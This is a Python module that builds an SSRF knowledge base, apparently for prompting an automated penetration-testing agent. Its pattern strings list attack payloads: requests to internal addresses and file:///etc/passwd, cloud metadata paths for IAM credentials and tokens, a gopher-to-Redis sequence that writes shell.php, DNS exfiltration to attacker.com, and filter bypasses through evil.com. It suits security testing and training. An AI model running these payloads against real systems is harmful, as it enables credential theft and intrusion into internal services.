"""SSRF deep knowledge base.

Deep knowledge about SSRF:
1. Basic SSRF techniques
2. Cloud metadata exploitation
3. Protocol smuggling
4. Blind SSRF detection
5. SSRF bypass techniques
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class SSRFPattern:
    """An SSRF attack pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


SSRF_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "ssrf-001", "name": "Basic SSRF Techniques",
        "category": "basic", "severity": "high",
        "desc": "Fundamental SSRF techniques.",
        "detection": (
            "BASIC SSRF:\n"
            "DETECTION:\n"
            "  - URL parameters (url=, src=, href=)\n"
            "  - Import/export features\n"
            "  - PDF generators\n"
            "  - Image processors\n"
            "  - Webhook URLs\n"
            "  - File inclusion (remote)\n"
            "  - XML external entities (XXE→SSRF)\n"
            "INTERNAL ACCESS:\n"
            "  - http://127.0.0.1:PORT\n"
            "  - http://localhost:PORT\n"
            "  - http://[::1]:PORT (IPv6)\n"
            "  - http://0.0.0.0:PORT\n"
            "  - Internal IPs (10.x, 172.16-31.x, 192.168.x)\n"
            "PORT SCANNING:\n"
            "  - Response time differences\n"
            "  - Error message differences\n"
            "  - Content length differences\n"
            "PROTOCOLS:\n"
            "  - file:///etc/passwd\n"
            "  - dict://localhost:PORT/info\n"
            "  - gopher://localhost:PORT/_payload\n"
            "  - tftp://evil/file\n"
            "  - ldap://localhost/\n"
            "  - ftp://evil/file\n"
            "TOOLS:\n"
            "  Burp Collaborator, SSRFmap, Gopherus"
        ),
        "tools": [],
    },
    {
        "id": "ssrf-002", "name": "Cloud Metadata Exploitation",
        "category": "metadata", "severity": "critical",
        "desc": "Cloud metadata service exploitation.",
        "detection": (
            "CLOUD METADATA EXPLOITATION:\n"
            "AWS:\n"
            "  http://169.254.169.254/latest/meta-data/\n"
            "  # IAM role credentials\n"
            "  /latest/meta-data/iam/security-credentials/ROLE\n"
            "  # User data (startup scripts)\n"
            "  /latest/user-data\n"
            "  # Instance identity document\n"
            "  /latest/dynamic/instance-identity/document\n"
            "  # IMDSv2 (token required)\n"
            "  curl -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'\n"
            "       -X PUT http://169.254.169.254/latest/api/token\n"
            "GCP:\n"
            "  http://metadata.google.internal/computeMetadata/v1/\n"
            "  # Requires: Metadata-Flavor: Google\n"
            "  /instance/service-accounts/default/token\n"
            "  /project/attributes/\n"
            "AZURE:\n"
            "  http://169.254.169.254/metadata/instance\n"
            "  # Requires: Metadata: true header\n"
            "  /metadata/identity/oauth2/token\n"
            "DIGITAL OCEAN:\n"
            "  http://169.254.169.254/metadata/v1/\n"
            "KUBERNETES:\n"
            "  https://kubernetes.default.svc/api/\n"
            "  # Service account token\n"
            "TOOLS:\n"
            "  SSRFmap, Burp, custom scripts"
        ),
        "tools": [],
    },
    {
        "id": "ssrf-003", "name": "Protocol Smuggling",
        "category": "protocol", "severity": "high",
        "desc": "SSRF via protocol smuggling.",
        "detection": (
            "PROTOCOL SMUGGLING:\n"
            "GOPHER:\n"
            "  - Redis command injection\n"
            "    # gopher://127.0.0.1:6379/_*1%0d%0a\n"
            "    # CONFIG SET dir /var/www/html\n"
            "    # CONFIG SET dbfilename shell.php\n"
            "  - MySQL exploitation\n"
            "    # gopher://127.0.0.1:3306/_ + MySQL packet\n"
            "  - FastCGI exploitation\n"
            "    # gopher://127.0.0.1:9000/_ + FCGI packet\n"
            "  - Memcached injection\n"
            "  - SMTP exploitation\n"
            "    # gopher://127.0.0.1:25/_ + SMTP commands\n"
            "DICT:\n"
            "  - dict://localhost:6379/SET key value\n"
            "  - dict://localhost:11211/stats\n"
            "CRLF INJECTION:\n"
            "  - HTTP request splitting\n"
            "  - Header injection via SSRF\n"
            "  - %0d%0a injection\n"
            "DNS REBINDING:\n"
            "  - Bypass IP validation\n"
            "  - First resolve → allowed IP\n"
            "  - Second resolve → internal IP\n"
            "  - Short TTL DNS records\n"
            "TOOLS:\n"
            "  Gopherus, SSRFmap, rbndr (DNS rebinding)"
        ),
        "tools": [],
    },
    {
        "id": "ssrf-004", "name": "Blind SSRF Detection",
        "category": "blind", "severity": "medium",
        "desc": "Blind SSRF detection techniques.",
        "detection": (
            "BLIND SSRF DETECTION:\n"
            "OUT-OF-BAND:\n"
            "  - DNS callback\n"
            "    # url=http://UNIQUE.burpcollaborator.net\n"
            "    # url=http://UNIQUE.interact.sh\n"
            "  - HTTP callback\n"
            "    # Wait for request to controlled server\n"
            "  - DNS exfiltration\n"
            "    # url=http://DATA.attacker.com\n"
            "TIME-BASED:\n"
            "  - Open port: fast response\n"
            "  - Closed port: timeout/error\n"
            "  - Different internal services\n"
            "  - Response time delta analysis\n"
            "ERROR-BASED:\n"
            "  - Different error messages\n"
            "  - Stack traces with internal info\n"
            "  - Content-Length differences\n"
            "  - Status code differences\n"
            "ESCALATION:\n"
            "  - Blind → Semi-blind\n"
            "    # Leak via DNS (data in subdomain)\n"
            "    # Leak via error messages\n"
            "  - Semi-blind → Full\n"
            "    # Find reflection point\n"
            "    # Find redirect to controlled domain\n"
            "TOOLS:\n"
            "  Burp Collaborator, interact.sh, SSRFmap"
        ),
        "tools": [],
    },
    {
        "id": "ssrf-005", "name": "SSRF Bypass Techniques",
        "category": "bypass", "severity": "high",
        "desc": "SSRF filter bypass techniques.",
        "detection": (
            "SSRF BYPASS TECHNIQUES:\n"
            "IP REPRESENTATION:\n"
            "  - Decimal: 2130706433 (127.0.0.1)\n"
            "  - Hex: 0x7f000001\n"
            "  - Octal: 0177.0.0.01\n"
            "  - Mixed: 127.1 (shorthand)\n"
            "  - IPv6: [::ffff:127.0.0.1]\n"
            "  - IPv6 mapped: [::ffff:7f00:1]\n"
            "  - 0 (resolves to 127.0.0.1)\n"
            "URL TRICKS:\n"
            "  - http://user@127.0.0.1\n"
            "  - http://127.0.0.1@evil.com\n"
            "  - http://evil.com#@127.0.0.1\n"
            "  - http://127.0.0.1%2523@evil.com\n"
            "  - URL encoding: %31%32%37%2e%30%2e%30%2e%31\n"
            "DNS TRICKS:\n"
            "  - Register domain → A record 127.0.0.1\n"
            "  - DNS rebinding (rbndr.us)\n"
            "  - Wildcard DNS (nip.io, sslip.io)\n"
            "    # 127.0.0.1.nip.io\n"
            "REDIRECT:\n"
            "  - HTTP redirect (302)\n"
            "    # Allowed URL → redirect → internal\n"
            "  - JavaScript redirect\n"
            "  - Meta refresh\n"
            "PROTOCOL:\n"
            "  - Scheme change: https→http→file→gopher\n"
            "  - Parser inconsistency\n"
            "  - Null byte: http://evil.com%00@allowed.com\n"
            "TOOLS:\n"
            "  SSRFmap, custom wordlists, Burp"
        ),
        "tools": [],
    },
]


class SSRFDeepKB:
    """SSRF deep knowledge base.

    Provides SSRF patterns injected
    into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, SSRFPattern] = {}
        self._log = logger.bind(component="ssrf_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load SSRF patterns."""
        for data in SSRF_PATTERNS:
            pattern = SSRFPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[SSRFPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_ssrf_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build SSRF prompt."""
        lines = ["## SSRF Attacks\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
